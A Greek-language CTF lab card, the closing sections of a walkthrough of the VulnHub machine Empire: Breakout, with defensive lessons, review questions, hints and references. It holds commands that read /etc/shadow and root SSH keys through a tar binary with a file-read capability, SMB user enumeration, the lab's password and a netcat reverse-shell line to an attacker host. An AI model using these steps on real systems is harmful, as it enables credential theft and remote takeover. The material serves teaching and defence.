Είστε root πια, άρα ένα απλό `cat` θα δούλευε — το νόημα είναι ότι **πριν** πληκτρολογήσετε ποτέ
`su`, οι ίδιες δύο εντολές είχαν ήδη εκθέσει κάθε root-readable αρχείο:

```bash
./tar -cf shadow.tar /etc/shadow && ./tar -xf shadow.tar && cat etc/shadow
./tar -cf rootssh.tar /root/.ssh && ./tar -xf rootssh.tar && ls -la root/.ssh
```

**Γιατί.** Μόλις ένα capability σας αφήνει να διαβάσετε τα πάντα, **απαριθμήστε κάθε αποθήκη
διαπιστευτηρίων — μην σταματήσετε στην πρώτη σημαία.** Το `/etc/shadow` δίνει το hash του root για
offline cracking (`$y$` = yescrypt, σκόπιμα πολύ αργό)· το `/root/.ssh/` μπορεί να κρατά
`authorized_keys` (ποιος μπορεί να συνδεθεί χωρίς κωδικό) και, χειρότερα, ένα μη κρυπτογραφημένο
ιδιωτικό κλειδί — ένα **μόνιμο** διαπιστευτήριο που επιβιώνει από την αλλαγή κωδικών.

---

# Μέρος Δ — Αμυντικά μαθήματα

| Εύρημα | Διόρθωση |
| --- | --- |
| Brainfuck μυστικό σε δημόσια σελίδα | Ό,τι είναι σε HTML είναι δημόσιο. Η συσκότιση δεν είναι εμπιστευτικότητα |
| **SMB null session + RID cycling** | Υποχρεωτικό SMB signing· περιορισμός anonymous enumeration |
| Webmin και Usermin εκτεθειμένα στο δίκτυο | **Δέστε τα στο localhost ή σε management VLAN.** Κονσόλες διαχείρισης δεν αντικρίζουν ποτέ το user δίκτυο |
| Usermin Command Shell ενεργό | Απενεργοποίηση του module — μια self-service κονσόλα δεν πρέπει να προσφέρει αυθαίρετη εκτέλεση εντολών |
| Patch drift (Usermin 1.830 vs Webmin 1.981) | Απογραφή **κάθε** component και έκδοσης· patch ανά οικογένεια |
| **Κωδικός root στο `/var/backups/`** | Ποτέ plaintext διαπιστευτήρια σε backups· secrets manager με audit logging |
| `cap_dac_read_search` σε binary ιδιοκτησίας χρήστη | Αφαίρεση του capability (`setcap -r /home/cyber/tar`)· τακτικό `getcap -r /` — τα περισσότερα baselines ελέγχουν SUID και ξεχνούν τα capabilities |
| Χωρίς SSH, αλλά με δύο web κονσόλες | Μείωση ενός remote path ανοίγοντας δύο άλλα = καθαρή απώλεια. Μετρήστε την **πραγματική** επιφάνεια επίθεσης |

**Το μεγαλύτερο δίδαγμα:** *ένα στενό προνόμιο μπορεί να είναι θανατηφόρο.* Το
`cap_dac_read_search` δεν εκτελεί και δεν γράφει — **μόνο διαβάζει**. Αρκούσε για να παραδώσει τον
root, γιατί ένα αναγνώσιμο αρχείο περιείχε τον κωδικό.

---

# Μέρος Ε — Ερωτήσεις επανάληψης

1. Ποια flags μετέτρεψαν πέντε ανώνυμες θύρες σε δύο αναγνωρίσιμες κονσόλες; Τι θα έδειχνε ένα γυμνό
   `nmap TARGET`, και τι θα είχε ακόμη κρύψει;
2. Η brainfuck είναι **Turing-complete γλώσσα**, όχι κωδικοποίηση. Κάνει αυτό το μυστικό δυσκολότερο
   από το base64; Εξηγήστε.
3. Webmin και Usermin είναι ίδια οικογένεια. Γιατί το **παλαιότερο** σας άφησε να μπείτε και το
   νεότερο όχι;
4. Γιατί το Usermin Command Shell είναι κακό υποκατάστατο κελύφους; Αναφέρετε τρεις περιορισμούς.
5. Το `cap_dac_read_search` είναι **στενότερο** από τον root. Γιατί ήταν ακόμη θανατηφόρο;
6. Όταν εξαγάγατε το αρχείο, γιατί άλλαξε ο ιδιοκτήτης σε εσάς; Εξηγήστε το `tar` και το
   `--same-owner`.
7. Το μηχάνημα δεν έχει SSH. Το έκανε πιο ασφαλές ή λιγότερο; Υποστηρίξτε και τις δύο πλευρές.

---

# Μέρος ΣΤ — Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Δύο πράγματα. **Πρώτον:** σαρώστε τα πάντα με εκδόσεις — `sudo nmap -p- -sV TARGET`. Σε μια γυμνή
σάρωση (χωρίς έκδοση) οι 10000 και 20000 φαίνονται ως ανώνυμη `http`· το `-sV` αποκαλύπτει το
`MiniServ`, και το `-p-` εγγυάται ότι δεν παραλείφθηκε τίποτα. **Δεύτερον:** η θύρα 80 σερβίρει την
stock σελίδα Apache — κοιτάξτε τον **πηγαίο κώδικα**· υπάρχει κάτι που δεν είναι αγγλικά, ούτε
base64, ούτε hex: σχεδόν μόνο `> < + - . [ ]`.
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — η κωδικοποίηση και το όνομα χρήστη</strong></summary>

Αυτό το σύνολο χαρακτήρων είναι **brainfuck** — γλώσσα, την **τρέχετε**. → `.2uqPEfj3D<P'a-3`. Για το
όνομα χρήστη: `enum4linux -a TARGET` / `crackmapexec smb TARGET --rid-brute 2000` → **`cyber`**.
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — ποια κονσόλα</strong></summary>

10000 = **Webmin** (root-level), 20000 = **Usermin** (per-user). Δοκιμάστε `cyber` + κωδικό σε **και**
τις δύο: **το Webmin αποτυγχάνει, το Usermin πετυχαίνει**. Βρείτε το **Command Shell** → `user.txt`
→ reverse shell.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — η αναβάθμιση</strong></summary>

`getcap -r / 2>/dev/null` → **`/home/cyber/tar cap_dac_read_search=ep`**. Χρησιμοποιήστε το στο
root-only `/var/backups/.old_pass.bak`: `./tar -cf b.tar /var/backups/.old_pass.bak` → `./tar -xf b.tar`
→ `cat var/backups/.old_pass.bak` → κωδικός root → `su root`.
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

1. `nmap -p- -sV` → **80, 139, 445, 10000, 20000** (χωρίς SSH). 2. Πηγαίος κώδικας → brainfuck →
`.2uqPEfj3D<P'a-3`. 3. `enum4linux`/RID → **`cyber`**. 4. **Usermin :20000** δέχεται `cyber`+κωδικό.
5. Command Shell → `user.txt` → reverse shell. 6. `getcap -r /` → **tar `cap_dac_read_search`**.
7. `tar` archive+extract → κωδικός root. 8. `su root` → `/root/rOOt.txt`.
</details>

---

# Μέρος Ζ — Παραπομπές

- **VulnHub entry:** <https://vulnhub.com/entry/empire-breakout,751/>
- **Αγγλικό lab του αποθετηρίου:** [`labs/3-028-empire-breakout/README.md`](../../labs/3-028-empire-breakout/README.md)
- **Αγγλική έκδοση αυτής της κάρτας:** [Learning Path 1 — Empire: Breakout](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/08-empire-breakout.md)
- **Writeups που διασταυρώθηκαν** (επιβεβαιώνουν 10000/20000, brainfuck, `cyber`, capability tar):
  - [Ra-Sec — Empire Breakout](https://ra2302.github.io/posts/Breakout/)
  - [The Village Hacker — Empire-breakout](https://thevillagehacker-security.gitbook.io/ctf-writeups/2023-10-01-proving_grounds_play-empire-breakout)
  - [Security Akademeia — Empire: Breakout](https://akademeia.info/?p=27242)
  - [HackTricks — Linux Capabilities](https://hacktricks.wiki/en/linux-hardening/interesting-files-permissions/linux-capabilities.html)
    (μετακινήθηκε από το `book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities`, που τώρα δίνει 404)

- **Σημειώσεις κοινότητας — ομοφωνία, παγίδες και εναλλακτικές διαδρομές** (διασταυρωμένες με τις παρακάτω πηγές):
  - **Ομοφωνία:** πλήρες `nmap -p-` → `80/139/445/10000/20000` → brainfuck στο page source του Apache → `.2uqPEfj3D<P'a-3` → SMB null session + RID cycling → χρήστης `cyber` → login στο **Usermin :20000** → Command Shell → `user.txt` → `getcap -r /` → `/home/cyber/tar cap_dac_read_search=ep` → archive+extract του `/var/backups/.old_pass.bak` → `su root` → `/root/rOOt.txt`.
  - ⚠️ **Σημείωση επαλήθευσης — τι δείχνει η προεπιλεγμένη σάρωση.** Παλαιότερο κείμενο εδώ ισχυριζόταν ότι μια προεπιλεγμένη σάρωση των top-1.000 βλέπει μόνο 80/139/445. Ελέγχθηκε απέναντι στον πίνακα συχνοτήτων `nmap-services` του nmap (10000 ≈ θέση 31, 20000 ≈ θέση 541 → και οι δύο στο προεπιλεγμένο σύνολο) και στο README του lab, που συμφωνεί: ένα απλό `nmap` **τις εμφανίζει**. Οι πραγματικές παγίδες είναι η σάρωση **χωρίς `-sV`** (και οι δύο κονσόλες μένουν ανώνυμη `http`) και η υπόθεση ότι το top-1.000 αρκεί στον πραγματικό κόσμο (8443/9090/10443/3000 ζουν έξω από αυτό). Κρατήστε το `-p- -sV` ως προεπιλεγμένη συνήθεια.
  - ⚠️ **Σημείωση επαλήθευσης — λεπτομέρειες αρχείων.** Τρία writeups (0bfxgh0st, The Village Hacker, Security Akademeia) δείχνουν το `/var/backups/.old_pass.bak` ως **17 bytes, με ημερομηνία 20 Oct 2021** (κωδικός 16 χαρακτήρων + newline) και το `/home/cyber/tar` ως **531928 bytes, Oct 19 2021** — παλαιότερο κείμενο σε αυτή την κάρτα έλεγε 16 bytes / 19 Oct, τώρα διορθώθηκε.
  - **Συχνή παγίδα:** ο `cyber` αποτυγχάνει στο Webmin :10000 αλλά πετυχαίνει στο Usermin :20000 — δοκιμάστε **κάθε** διαπιστευτήριο σε **κάθε** επιφάνεια σύνδεσης, και διαβάστε τον τίτλο της σελίδας σύνδεσης αντί για τα πανομοιότυπα banners `MiniServ … (Webmin httpd)` του nmap.
  - **Συχνή παγίδα:** το `su root` μέσα στο Usermin Command Shell αποτυγχάνει (`Authentication failure`, κατά τη Security Akademeia) — πάρτε πρώτα πραγματικό reverse shell (Βήμα 6)· ο The Village Hacker και η Security Akademeia δείχνουν και οι δύο το `su root` να δουλεύει από το απλό reverse shell, και η αναβάθμιση με `python3 pty.spawn` μετά διορθώνει prompts, tab completion και εισαγωγή κωδικού.
  - **Εναλλακτικές διαδρομές:** `rpcclient -U "" -N` με βρόχο `lookupsids S-1-22-1-$i` ή `crackmapexec smb --rid-brute` αντί για `enum4linux` (0bfxgh0st)· ο CyberArri αρχειοθέτησε **ολόκληρο τον κατάλογο** (`cd /tmp && /home/cyber/tar -cvf new.tar /var/backups`) αντί για ένα αρχείο· `nc <kali> 4444 -e /bin/bash` από το web box όταν υπάρχει netcat (CyberArri)· και μόλις κρατήσετε τον κωδικό του root, το **Webmin :10000 δέχεται τον `root`** — το δικό του Command Shell διαβάζει το `rOOt.txt` για σας (Security Akademeia, βήμα 21).
  - **Επίσης:** η σημαία root είναι `rOOt.txt` με κεφαλαίο "O" — κάντε `ls -la` πριν υποθέσετε `r00t.txt`. Η παραλλαγή Proving Grounds Play αυτού του μηχανήματος (The Village Hacker) παραδίδει `local.txt` αντί για `user.txt`· η αλυσίδα περιεχομένου είναι κατά τα άλλα ίδια.
  - **Επαληθευμένες πηγές:** [Ra-Sec](https://ra2302.github.io/posts/Breakout/) · [The Village Hacker](https://thevillagehacker-security.gitbook.io/ctf-writeups/2023-10-01-proving_grounds_play-empire-breakout) · [0bfxgh0st](https://0bfxgh0st.github.io/vulnhub/empire-breakout/) · [CyberArri](https://cyberarri.com/2022/07/25/empire-breakout/)

---

# Μέρος Η — Αν κολλήσετε τελείως

- Επαληθεύστε τη συνδεσιμότητα: `ping TARGET`, `ip -br a`.
- **`-p- -sV` πρώτα** — μια γυμνή σάρωση απαριθμεί τις ψηλές θύρες αλλά κρύβει *τι* είναι (και το
  `-p-` εγγυάται ότι δεν παραλείψατε εξαρχής καμία θύρα).
- Αν το `su` αποτύχει ή το prompt συμπεριφέρεται περίεργα, είστε ακόμη στο πλαίσιο browser χωρίς TTY
  — ξανακάντε το Βήμα 6.
- Δείτε [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) και [`docs/TOOLS.md`](../../docs/TOOLS.md).
- Επαναφέρετε το snapshot και ξανακάντε το από μνήμης.

---

_Πίσω στη [Μαθησιακή Διαδρομή 1](../README.md) · προηγούμενο: [Μηχάνημα 7 — Mr-Robot: 1](<07-mr-robot-1.md>) · επόμενο: [Μηχάνημα 9 — CengBox: 1](<09-cengbox-1.md>) · πλήρες walkthrough: [`labs/3-028-empire-breakout`](../../labs/3-028-empire-breakout/README.md)_
